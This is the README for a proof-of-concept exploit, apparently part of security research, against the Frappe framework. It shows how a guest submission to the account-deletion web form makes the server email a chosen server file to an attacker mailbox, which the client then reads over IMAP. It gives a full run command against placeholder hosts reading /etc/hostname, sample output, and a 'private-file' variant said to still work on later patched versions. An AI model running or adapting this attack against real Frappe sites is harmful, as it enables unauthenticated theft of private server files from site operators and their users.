# FRAPPE-01 email file-disclosure PoC

This client submits the public account-deletion form, waits for Frappe's
confirmation email, and extracts the selected server file from its MIME parts.

## Requirements

- Python 3.10 or newer
- the published `request-to-delete-data` Web Form with Guest access
- working outgoing email and a queue worker
- an attacker-controlled mailbox with IMAP access
- a server path known or guessed by the attacker

The target process must be able to read the file. The email field's length,
SMTP's address limits, message-size limits, and MIME handling may restrict which
paths and files work.

## Usage

Set the password for the attacker's receiving mailbox, then run:

```console
FRAPPE_POC_IMAP_PASSWORD='mailbox password' \
  python3 frappe01_email_file_read.py \
  --url https://frappe.example.test \
  --file /etc/hostname \
  --attacker-email researcher@example.test \
  --imap-host imap.example.test \
  --imap-user researcher@example.test \
  --output recovered.bin
```

```text
 [*] requesting /etc/hostname through recipient researcher@example.test
 [+] Guest submission accepted; waiting for the matching email
 [+] recovered 18 bytes; wrote them to recovered.bin
```

Without `--output`, the recovered bytes are written to stdout, so you can pipe
them straight into a file. Progress and the recovered byte count go to stderr as
coloured status lines; pass `--no-color` (or set `NO_COLOR=1`) to disable colour,
and see `--help` for every option.

Use `--attacker-domain mail.example.test` instead of `--attacker-email` when
you control a catch-all domain. This form places the payload in the local part,
which cannot exceed 64 bytes.

Frappe 15.117.0 and 16.30.0 reject the absolute-path form above, but the same
email path still accepts a known or guessed site-private filename. Use
`--path-mode private-file --file private/files/NAME` for that variant. This
shows that the email helper can read the named path. It does not establish a
separate symlink issue.

IMAPS on port 993 is the default. `--imap-port` selects another port and
`--imap-mailbox` selects another folder. `--imap-plain` disables TLS and should
only be used where plaintext IMAP is intentional.

## Version scope

The absolute-path disclosure was reproduced on Frappe 16.29.0. The directory restriction first appeared in 15.117.0 and 16.30.0, which Frappe's advisory [GHSA-8v98-cfpm-9p67](https://github.com/frappe/frappe/security/advisories/GHSA-8v98-cfpm-9p67) lists as the patched versions, while the named `private/files/` route remains in 16.51.0 and 15.122.0.
